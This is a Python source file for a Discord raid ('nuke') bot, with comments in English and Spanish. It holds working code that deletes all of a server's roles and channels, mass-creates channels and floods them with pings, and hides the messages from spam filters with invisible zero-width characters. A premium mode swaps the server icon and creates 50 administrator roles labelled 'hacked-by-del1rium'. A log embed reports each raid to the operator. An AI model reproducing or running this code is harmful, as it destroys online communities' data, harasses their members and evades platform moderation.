import discord
import asyncio
import aiohttp
import random
from datetime import datetime

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# [ STEALTH MODULE / MODULO DE INVISIBILIDAD ]
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def get_stealth_text(base_text):
    """
    Adds invisible characters (Zero Width Space) to bypass bot detection.
    The text looks identical to the human eye but is unique for Discord.
    """
    # \u200b is a Zero Width Space (invisible)
    invisible_chars = "\u200b" * random.randint(1, 5)
    # Randomly place invisible characters or double spaces
    if random.choice([True, False]):
        return f"{base_text}{invisible_chars}"
    else:
        return base_text.replace(" ", "  ", 1) + invisible_chars

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# [ EXECUTION ENGINE / MOTOR DE EJECUCION ]
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

async def execute_nuke(ctx, bot, channel_name, spam_text, num_channels, total_pings, is_premium, log_id, icon_url):
    guild = ctx.guild
    original_member_count = guild.member_count
    raid_type = "PREMIUM" if is_premium else "STANDARD / ESTANDAR"
    
    print(f"INITIATING RAID {raid_type} IN: {guild.name}")
    
    # 1. Ultra-Fast Destruction
    # We use gather to delete everything at once without waiting
    destruction_tasks = [
        *(role.delete() for role in guild.roles if not role.is_default() and not role.managed),
        *(channel.delete() for channel in guild.channels)
    ]
    
    if is_premium:
        destruction_tasks.append(execute_premium_actions(guild, icon_url))
        
    await asyncio.gather(*destruction_tasks, return_exceptions=True)
    
    # 2. Hyper-Speed Spam
    pings_per_channel = total_pings // num_channels if num_channels > 0 else 0
    remaining_pings = total_pings % num_channels if num_channels > 0 else 0
    
    # Launch all channel creations simultaneously
    channel_tasks = []
    for i in range(num_channels):
        extra_ping = 1 if i < remaining_pings else 0
        channel_tasks.append(create_and_spam(guild, channel_name, spam_text, i, pings_per_channel + extra_ping, is_premium))
    
    await asyncio.gather(*channel_tasks, return_exceptions=True)
    
    print(f"RAID COMPLETED IN: {guild.name}")
    await send_log_embed(ctx, bot, raid_type, original_member_count, num_channels, total_pings, log_id)

async def create_and_spam(guild, channel_name, spam_text, index, num_pings, is_premium):
    try:
        # Fast channel creation
        channel = await guild.create_text_channel(f"{channel_name}-{index+1}")
        # Start spamming immediately without waiting
        asyncio.create_task(spam_pings(channel, spam_text, num_pings, is_premium))
    except Exception: pass

async def spam_pings(channel, spam_text, amount, is_premium):
    """
    Extreme speed spam logic with invisible Anti-Bot protection.
    """
    for _ in range(amount):
        try:
            # Use stealth text only if premium to bypass filters invisibly
            final_text = get_stealth_text(spam_text) if is_premium else spam_text
            
            await channel.send(final_text)
            # No sleep for maximum speed. Discord's rate limit will be handled by the exception.
            
        except discord.HTTPException as e:
            if e.status == 429: # Rate limit hit
                # Wait exactly what Discord asks and then continue
                retry_after = e.retry_after if hasattr(e, 'retry_after') else 1.0
                await asyncio.sleep(retry_after)
            else:
                break
        except Exception:
            break

async def execute_premium_actions(guild, icon_url):
    # Parallel execution of icon change and role creation
    tasks = [change_server_icon(guild, icon_url), create_chaotic_roles(guild)]
    await asyncio.gather(*tasks, return_exceptions=True)

async def change_server_icon(guild, icon_url):
    try:
        async with aiohttp.ClientSession() as session, session.get(icon_url) as resp:
            if resp.status == 200: await guild.edit(icon=await resp.read())
    except Exception: pass

async def create_chaotic_roles(guild):
    # Create all 50 roles at once
    tasks = [
        guild.create_role(
            name=f"hacked-by-del1rium-{i}", 
            permissions=discord.Permissions(administrator=True)
        ) for i in range(50)
    ]
    await asyncio.gather(*tasks, return_exceptions=True)

async def send_log_embed(ctx, bot, raid_type, member_count, channels, total_pings, log_id):
    log_channel = bot.get_channel(log_id)
    if not log_channel: return
    
    embed = discord.Embed(
        title="OPERATION REPORT / REPORTE DE OPERACION",
        color=0x2b2d31,
        timestamp=datetime.utcnow()
    )
    embed.add_field(name="Server / Servidor", value=f"**{ctx.guild.name}**\n`({ctx.guild.id})`", inline=True)
    embed.add_field(name="Author / Autor", value=f"{ctx.author.mention}", inline=True)
    embed.add_field(name="Type / Tipo", value=f"`{raid_type}`", inline=True)
    
    stats = f"```\nMembers / Miembros: {member_count}\nChannels / Canales: {channels}\nPings / Pings:     {total_pings}\n```"
    embed.add_field(name="Statistics / Estadisticas", value=stats, inline=False)
    
    if ctx.guild.icon: embed.set_thumbnail(url=ctx.guild.icon.url)
    embed.set_footer(text="Operation Finished / Operacion Finalizada")
    
    try: await log_channel.send(embed=embed)
    except: pass
